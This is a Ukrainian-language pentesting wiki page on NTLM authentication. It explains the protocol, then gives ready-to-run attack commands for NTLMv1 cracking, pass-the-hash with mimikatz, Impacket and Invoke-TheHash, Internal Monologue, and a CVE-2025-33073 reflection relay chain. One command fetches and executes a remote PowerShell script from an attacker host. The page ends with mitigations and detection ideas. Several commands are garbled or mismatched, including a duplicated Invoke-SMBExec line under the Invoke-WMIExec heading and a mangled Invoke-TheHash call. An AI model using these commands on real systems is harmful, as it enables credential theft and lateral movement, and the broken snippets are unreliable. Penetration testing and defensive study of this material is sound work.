# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Основна інформація

У середовищах, де використовуються **Windows XP і Server 2003**, застосовуються хеші LM (Lan Manager), хоча загальновідомо, що їх легко скомпрометувати. Спеціальний хеш LM `AAD3B435B51404EEAAD3B435B51404EE` означає, що LM не використовується, і є хешем порожнього рядка.

За замовчуванням основним методом є протокол автентифікації **Kerberos**. NTLM (NT LAN Manager) використовується за певних обставин: відсутність Active Directory, відсутність домену, неправильна робота Kerberos через некоректну конфігурацію або спроба встановити з’єднання за IP-адресою, а не за дійсним ім’ям хоста.

Наявність заголовка **"NTLMSSP"** у мережевих пакетах вказує на процес автентифікації NTLM.

Підтримку протоколів автентифікації LM, NTLMv1 і NTLMv2 забезпечує DLL, розташована за адресою `%windir%\Windows\System32\msv1\_0.dll`.

**Основні моменти**:

- Хеші LM вразливі, а порожній хеш LM (`AAD3B435B51404EEAAD3B435B51404EE`) означає, що LM не використовується.
- Kerberos є методом автентифікації за замовчуванням; NTLM використовується лише за певних умов.
- Пакети автентифікації NTLM можна розпізнати за заголовком "NTLMSSP".
- Протоколи LM, NTLMv1 і NTLMv2 підтримуються системним файлом `msv1\_0.dll`.

## LM, NTLMv1 і NTLMv2

Перевірити й налаштувати протокол, який використовуватиметься, можна так:

### GUI

Запустіть _secpol.msc_ -> Локальні політики -> Параметри безпеки -> Мережева безпека: рівень автентифікації LAN Manager. Є 6 рівнів (від 0 до 5).

![LM, NTLMv1 і NTLMv2 - GUI: запустіть secpol.msc - Локальні політики - Параметри безпеки - Мережева безпека: рівень автентифікації LAN Manager. Є 6 рівнів (від 0 до 5)](<../../images/image (919).png>)

### Реєстр

Буде встановлено рівень 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Можливі значення:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Базова схема автентифікації домену NTLM

1. **Користувач** вводить свої **облікові дані**
2. Клієнтська машина **надсилає запит на автентифікацію**, передаючи **ім’я домену** та **ім’я користувача**
3. **Сервер** надсилає **challenge**
4. **Клієнт шифрує** **challenge**, використовуючи хеш пароля як ключ, і надсилає його у відповідь
5. **Сервер надсилає** **Контролеру домену** **ім’я домену, ім’я користувача, challenge та відповідь**. Якщо Active Directory **не налаштовано** або ім’я домену збігається з іменем сервера, облікові дані **перевіряються локально**.
6. **Контролер домену перевіряє, чи все правильно**, і надсилає інформацію серверу

**Сервер** і **Контролер домену** можуть створити **захищений канал** через сервер **Netlogon**, оскільки Контролер домену знає пароль сервера (він зберігається у базі даних **NTDS.DIT**).

### Локальна схема автентифікації NTLM

Автентифікація відбувається так само, як описано **вище, але** **сервер** знає **хеш користувача**, який намагається автентифікуватися; він міститься у файлі **SAM**. Тож замість звернення до Контролера домену **сервер сам перевірить**, чи може користувач пройти автентифікацію.

### Challenge NTLMv1

**Довжина challenge становить 8 байтів**, а **довжина відповіді — 24 байти**.

**Хеш NT (16 байтів)** ділиться на **3 частини по 7 байтів кожна** (7B + 7B + (2B+0x00\*5)): **остання частина заповнюється нулями**. Потім **challenge** **шифрується окремо** кожною частиною, а **отримані** зашифровані байти **об’єднуються**. Усього: 8B + 8B + 8B = 24 байти.

**Проблеми**:

- Відсутність **випадковості**
- На 3 частини можна **атакувати окремо**, щоб знайти хеш NT
- **DES можна зламати**
- **3-й ключ** завжди складається з **5 нулів**.
- Якщо **challenge** однаковий, **відповідь** також буде **однаковою**. Тож можна надіслати жертві як **challenge** рядок "**1122334455667788**" і атакувати відповідь за допомогою **попередньо обчислених rainbow tables**.

### Атака NTLMv1

Unconstrained delegation трапляється рідше в сучасних середовищах, але доступною службою **Print Spooler** усе ще можна зловживати, примушуючи її автентифікуватися на такому хості.

Можна зловживати обліковими даними/сеансами AD, які у вас уже є, щоб **попросити принтер автентифікуватися** на **контрольованому вами хості**. Потім за допомогою `metasploit auxiliary/server/capture/smb` або `responder` можна **встановити challenge автентифікації 1122334455667788**, перехопити спробу автентифікації та, якщо вона виконувалася за допомогою **NTLMv1**, **зламати її**.\
Якщо ви використовуєте `responder`, можна спробувати **використати прапорець `--lm`**, щоб спробувати **понизити версію** **автентифікації**.\
_Зауважте, що для цієї техніки автентифікація має виконуватися за допомогою NTLMv1 (NTLMv2 не підходить)._

Пам’ятайте, що під час автентифікації принтер використовуватиме обліковий запис комп’ютера, а облікові записи комп’ютерів мають **довгі випадкові паролі**, які ви, **ймовірно, не зможете зламати** за допомогою звичайних **словників**. Але для автентифікації **NTLMv1** використовується **DES** ([докладніше тут](#ntlmv1-challenge)), тож спеціалізовані сервіси для злому DES допоможуть вам зламати його (наприклад, [https://crack.sh/](https://crack.sh) або [https://ntlmv1.com/](https://ntlmv1.com)).

### Атака NTLMv1 за допомогою hashcat

NTLMv1 також можна атакувати за допомогою [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), який перетворює перехоплені повідомлення NTLMv1 у формати, придатні для Hashcat.<sup>[[1]](#references)</sup>

Команда

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

виведе наведене нижче:

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Створіть файл із таким вмістом:

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Запустіть hashcat (краще розподілено через інструмент на кшталт hashtopolis), інакше це займе кілька днів.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

У цьому випадку ми знаємо, що пароль до цього — password, тож для демонстрації трохи схитруємо:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Тепер нам потрібно використати hashcat-utilities, щоб перетворити підібрані ключі DES на частини хешу NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

І нарешті, остання частина:

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Об’єднайте їх:

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### NTLMv2 Challenge

**Довжина challenge становить 8 байтів**, а **надсилаються 2 відповіді**: одна має довжину **24 байти**, а довжина **іншої** є змінною.

**Перша відповідь** створюється шифруванням за допомогою **HMAC_MD5** **рядка**, утвореного з **клієнта та домену**, з використанням як **ключа** **хешу MD4** від **NT-хешу**. Потім **результат** використовується як **ключ** для шифрування **challenge** за допомогою **HMAC_MD5**. До нього додається **client challenge довжиною 8 байтів**. Разом: 24 Б.

**Друга відповідь** створюється з використанням **кількох значень** (нового client challenge, **мітки часу** для запобігання **атакам повторного відтворення**...)

Якщо у вас є **PCAP із успішним обміном даними автентифікації**, витягніть домен, ім’я користувача, server challenge та NTLMv2 response, відформатуйте захоплені дані для Hashcat і скористайтеся режимом `5600`, щоб спробувати відновити пароль. Архівований практичний посібник зберігає процедуру вилучення полів пакета, а приклади Hashcat визначають актуальний прийнятний формат.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Отримавши хеш жертви**, ви можете використати його, щоб **видати себе за неї**.\
Вам потрібно скористатися **інструментом**, який **виконає** **автентифікацію NTLM із використанням** цього **хешу**, **або** створити новий **sessionlogon** і **впровадити** цей **хеш** у **LSASS**, щоб під час будь-якої **автентифікації NTLM** використовувався цей **хеш**. Саме так працює останній варіант у mimikatz.

**Пам’ятайте, що атаки Pass-the-Hash можна виконувати також із використанням облікових записів комп’ютерів.**

### **Mimikatz**

**Потрібно запускати від імені адміністратора**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Це запускає процес від імені поточного локального користувача, а LSASS пов’язує надані облікові дані з його вихідним мережевим входом. Після цього ви можете отримувати доступ до мережевих ресурсів від імені вказаного користувача, як і за допомогою `runas /netonly`, не знаючи пароля у відкритому вигляді.

### Pass-the-Hash з Linux

Ви можете отримати виконання коду на машинах Windows за допомогою Pass-the-Hash з Linux.\
[**Перегляньте практичні приклади виконання Pass-the-Hash за допомогою Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Скомпільовані інструменти Impacket для Windows

Ви можете завантажити [бінарні файли impacket для Windows тут](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (У цьому випадку потрібно вказати команду; cmd.exe і powershell.exe не підходять для отримання інтерактивної оболонки)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Є ще кілька бінарних файлів Impacket...

### Invoke-TheHash

Ви можете отримати скрипти powershell тут: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Ця функція поєднує попередні режими. Ви можете вказати **кілька хостів**, виключити вибрані цілі та вибрати _SMBExec, WMIExec, SMBClient_ або _SMBEnum_. Якщо вибрати **SMBExec** або **WMIExec** без параметра _**Command**_, функція лише перевірить, чи маєте ви достатні дозволи.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Потрібно запускати від імені адміністратора**

Цей інструмент робить те саме, що й mimikatz (змінює пам’ять LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Ручне віддалене виконання команд Windows за допомогою імені користувача та пароля


{{#ref}}
../lateral-movement/
{{#endref}}

## Викрадення облікових даних із хоста Windows

Докладніше див. у статті [**Викрадення облікових даних Windows**](../stealing-credentials/README.md).

## Атака Internal Monologue

Атака Internal Monologue — це прихована техніка викрадення облікових даних, яка дає змогу зловмиснику отримувати NTLM-хеші з комп’ютера жертви **без безпосередньої взаємодії з процесом LSASS**. На відміну від Mimikatz, який зчитує хеші безпосередньо з пам’яті й часто блокується засобами безпеки кінцевих точок або Credential Guard, ця атака використовує **локальні виклики пакета автентифікації NTLM (MSV1_0) через інтерфейс постачальника підтримки безпеки (SSPI)**. Спочатку зловмисник **понижує параметри NTLM** (наприклад, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), щоб дозволити NetNTLMv1. Потім він видає себе за наявні токени користувачів, отримані з запущених процесів, і локально запускає автентифікацію NTLM для створення відповідей NetNTLMv1 із використанням відомого виклику.<sup>[[4]](#references)</sup>

Захопивши ці відповіді NetNTLMv1, зловмисник може швидко відновити оригінальні NTLM-хеші за допомогою **попередньо обчислених rainbow tables**, що дає змогу виконувати подальші атаки Pass-the-Hash для латерального переміщення. Важливо, що атака Internal Monologue залишається прихованою, оскільки не генерує мережевого трафіку, не впроваджує код і не запускає пряме зняття дампів пам’яті, тому її складніше виявити, ніж традиційні методи на кшталт Mimikatz.

Якщо NetNTLMv1 не приймається через застосовані політики безпеки, зловмиснику може не вдатися отримати відповідь NetNTLMv1.

Щоб обійти цю проблему, інструмент Internal Monologue оновили: тепер він динамічно отримує токен сервера за допомогою `AcceptSecurityContext()`, щоб **захоплювати відповіді NetNTLMv2**, якщо NetNTLMv1 не спрацьовує. Зламати NetNTLMv2 набагато складніше, але він усе ще відкриває шлях до relay-атак або офлайн-перебору в окремих випадках.

PoC доступний за посиланням **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay і Responder

**Докладний посібник із виконання цих атак читайте тут:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Розбір викликів NTLM із мережевого захоплення

**Можна скористатися** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM і Kerberos *Reflection* через серіалізовані SPN (CVE-2025-33073)

У Windows є кілька засобів захисту від атак *reflection*, під час яких автентифікація NTLM (або Kerberos), що починається на хості, ретранслюється назад на **той самий** хост для отримання привілеїв SYSTEM.  

Microsoft зламала більшість публічних ланцюжків за допомогою MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) і подальших виправлень. Однак **CVE-2025-33073** показує, що захист усе ще можна обійти, зловживаючи тим, як **SMB-клієнт обрізає імена учасників-служб (SPN)**, що містять *маршалізовану* (серіалізовану) інформацію про ціль.<sup>[[5]](#references)[[6]](#references)</sup>

### Коротко про вразливість
1. Зловмисник реєструє **DNS A-запис**, мітка якого містить закодований маршалізований SPN, наприклад:
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Жертву змушують автентифікуватися на цьому імені хоста (PetitPotam, DFSCoerce тощо).
3. Коли SMB-клієнт передає цільовий рядок `cifs/srv11UWhRCAAAAA…` до `lsasrv!LsapCheckMarshalledTargetInfo`, виклик `CredUnmarshalTargetInfo` **видаляє** серіалізований блок, залишаючи **`cifs/srv1`**.
4. Тепер `msv1_0!SspIsTargetLocalhost` (або еквівалент для Kerberos) вважає ціль *localhost*, оскільки коротка частина імені хоста збігається з іменем комп’ютера (`SRV1`).
5. У результаті сервер встановлює `NTLMSSP_NEGOTIATE_LOCAL_CALL` і впроваджує в контекст **токен доступу SYSTEM процесу LSASS** (для Kerberos створюється ключ підсеансу з позначкою SYSTEM).
6. Ретрансляція цієї автентифікації за допомогою `ntlmrelayx.py` **або** `krbrelayx.py` надає повні права SYSTEM на тому самому хості.<sup>[[5]](#references)</sup>

### Швидкий PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Виправлення та заходи пом’якшення
* Патч KB для **CVE-2025-33073** додає перевірку в `mrxsmb.sys::SmbCeCreateSrvCall`, яка блокує будь-яке SMB-з’єднання, ціль якого містить marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Увімкніть **SMB signing** для цілей SMB relay. Для інших цілей перевірте вимоги до підпису або Extended Protection відповідного протоколу та рівень встановлених патчів; сам по собі SMB signing не визначає, чи можливий HTTPS WinRM relay.
* Відстежуйте DNS-записи, схожі на `*<base64>...*`, і блокуйте вектори примусу автентифікації (PetitPotam, DFSCoerce, AuthIP...).

### Ідеї для виявлення
* Мережеві дампи з `NTLMSSP_NEGOTIATE_LOCAL_CALL`, де IP клієнта ≠ IP сервера.
* Kerberos AP-REQ із subsession key і principal клієнта, що збігається з ім’ям хоста.
* Входи SYSTEM у Windows Event 4624/4648, за якими одразу йдуть віддалені записи через SMB з того самого хоста.<sup>[[5]](#references)</sup>

Серіалізоване DNS-ім’я target-information також може спрямувати примусову автентифікацію до атакувальника для **cross-protocol relay** на endpoint вебреєстрації AD CS. Це окремий сценарій, не пов’язаний із reflection на тому самому хості: умови реєстрації [ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), права на запис DNS, шлях примусу автентифікації та рівень патчів цілі потрібно оцінювати окремо.

Про варіант локального reflection за **березень 2026 року**, який використовує **довільні порти SMB** і **повторне використання TCP-з’єднання** для отримання `NT AUTHORITY\SYSTEM`, дивіться:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – мультитул NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Приклади хешів Hashcat – NetNTLMv2 (режим 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – утиліти PowerShell Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Атака Internal Monologue: отримання NTLM-хешів без доступу до LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection помер, хай живе NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Злам NTLMv2-хешу – 801Labs (Інтернет-архів)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
